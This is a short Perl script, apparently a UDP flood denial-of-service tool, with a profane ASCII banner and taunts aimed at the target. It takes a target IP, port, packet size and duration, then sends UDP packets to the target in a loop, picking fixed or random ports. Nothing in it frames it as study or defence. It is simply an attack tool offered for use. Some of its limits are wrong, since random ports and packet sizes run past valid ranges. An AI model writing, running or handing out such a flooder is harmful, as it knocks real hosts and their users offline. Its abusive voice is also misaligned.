#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# Harley <---
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

 ���____      _��������     ���        _�������� 
 ��������_   ���    ��� ����������_   ���    ��� 
 ���   ���   ���    ��     ��������   ���    ��  
 ���   ���  _���___         ���   �   ���        
 ���   ��� ��������         ���     ������������ 
 ���   ���   ���    �_      ���              ��� 
 ���   ���   ���    ���     ���        _�    ��� 
  ��   ��    ����������    _�����    _���������  
                                                          
Imagine Getting Slammed by a Scrpit :)
Fucking Skid Got Slammed

EOTEXT

print "Fuck you up : $ip " . ($port ? $port : "random") . "
Getting Fucked with " .
  ($size ? "$size byte's" : "Error..") . "
  ~Call me a God SKID~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}  